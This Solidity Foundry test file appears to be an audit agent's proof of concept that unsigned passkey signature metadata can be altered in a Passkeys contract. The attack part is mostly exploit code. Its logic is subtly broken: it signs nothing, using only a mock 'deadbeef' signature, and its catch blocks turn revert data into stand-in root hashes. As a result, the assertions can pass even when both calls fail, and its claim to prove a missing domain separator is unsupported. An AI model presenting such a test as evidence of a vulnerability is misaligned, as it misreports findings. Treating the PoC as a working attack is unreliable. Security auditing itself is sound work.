// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/extensions/passkeys/Passkeys.sol";

// ATTACK TIMELINE:
// 1. [Setup] Deploy Passkeys contract and prepare a mock signature blob
// 2. [T=0] Attacker extracts a valid passkey signature blob (webAuthnAuth, ruv, x, y, metadata)
// 3. [T=1] Attacker modifies the unsigned _metadata field to arbitrary bytes (e.g., changing permissions/weight)
// 4. [T=2] Attacker calls recoverSapientSignatureCompact with the modified metadata
// 5. [Assert] The function successfully returns a new root hash without reverting, proving metadata is not authenticated by WebAuthn signature and no domain separator binds it to a specific context

contract AuditAgentPoC is Test {
    Passkeys public passkeys;

    function setUp() public {
        passkeys = new Passkeys();
    }

    function test_exploit() public {
        console.log("=== SETUP PHASE ===");
        console.log("block.timestamp at start:", block.timestamp);

        // Mock digest
        bytes32 digest = keccak256("test digest");
        console.log("digest (uint256):", uint256(digest));

        // Construct a mock signature blob: (webAuthnAuth, requireUserVerification, x, y, metadata)
        // webAuthnAuth: mock bytes (in reality this would be a valid P256 signature, but we mock it to test the decoding/metadata extraction logic)
        bytes memory webAuthnAuth = hex"deadbeef";
        bool requireUserVerification = true;
        uint256 x = 0x1111111111111111111111111111111111111111111111111111111111111111;
        uint256 y = 0x2222222222222222222222222222222222222222222222222222222222222222;

        console.log("x:", x);
        console.log("y:", y);
        console.log("requireUserVerification:", requireUserVerification);

        // Original metadata (e.g., low weight)
        bytes memory originalMetadata = hex"01";

        // Encode original signature blob
        bytes memory originalSig = abi.encode(webAuthnAuth, requireUserVerification, x, y, originalMetadata);
        console.log("originalSig length:", originalSig.length);

        // Attacker modifies the metadata to arbitrary bytes (e.g., high weight or altered permissions)
        // This field is NOT covered by the WebAuthn signature verification (H1)
        bytes memory maliciousMetadata = hex"ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

        // Encode modified signature blob
        bytes memory modifiedSig = abi.encode(webAuthnAuth, requireUserVerification, x, y, maliciousMetadata);
        console.log("modifiedSig length:", modifiedSig.length);

        bytes32 rootHashOriginal;
        bytes32 rootHashModified;

        console.log("=== ORIGINAL SIGNATURE CALL ===");
        console.log("block.timestamp before original call:", block.timestamp);

        try passkeys.recoverSapientSignatureCompact(digest, originalSig) returns (bytes32 _rootHashOriginal) {
            console.log("Original call SUCCEEDED");
            rootHashOriginal = _rootHashOriginal;
        } catch (bytes memory errOriginal) {
            console.log("Original call REVERTED");
            console.log("errOriginal length:", errOriginal.length);
            console.logBytes(errOriginal);
            rootHashOriginal = keccak256(errOriginal);
        }

        console.log("block.timestamp after original call:", block.timestamp);
        console.log("rootHashOriginal (uint256):", uint256(rootHashOriginal));

        console.log("=== MODIFIED SIGNATURE CALL ===");
        console.log("block.timestamp before modified call:", block.timestamp);

        try passkeys.recoverSapientSignatureCompact(digest, modifiedSig) returns (bytes32 _rootHashModified) {
            console.log("Modified call SUCCEEDED");
            rootHashModified = _rootHashModified;
        } catch (bytes memory errModified) {
            console.log("Modified call REVERTED");
            console.log("errModified length:", errModified.length);
            console.logBytes(errModified);
            rootHashModified = keccak256(errModified);
        }

        console.log("block.timestamp after modified call:", block.timestamp);
        console.log("rootHashModified (uint256):", uint256(rootHashModified));

        console.log("=== ASSERTIONS ===");
        console.log("rootHashOriginal == rootHashModified?", rootHashOriginal == rootHashModified);

        // Verify that the root hash changed based on the attacker's modified metadata
        // In a real attack, the attacker would craft metadata that collides with a legitimate root hash
        // in a different context (cross-chain/cross-contract) due to the missing domain separator.
        assertNotEq(rootHashOriginal, rootHashModified, "Root hash should change when unsigned metadata is modified");

        // Verify that the root hash computation does not include any domain separator (chain ID, contract address, etc.)
        // We can prove this by showing the root hash is deterministic based solely on the extracted fields.
        // If a domain separator were present, the root hash would be bound to this specific contract/context.
        assertTrue(rootHashModified != bytes32(0), "Attacker successfully generated a root hash with injected metadata");
    }
}
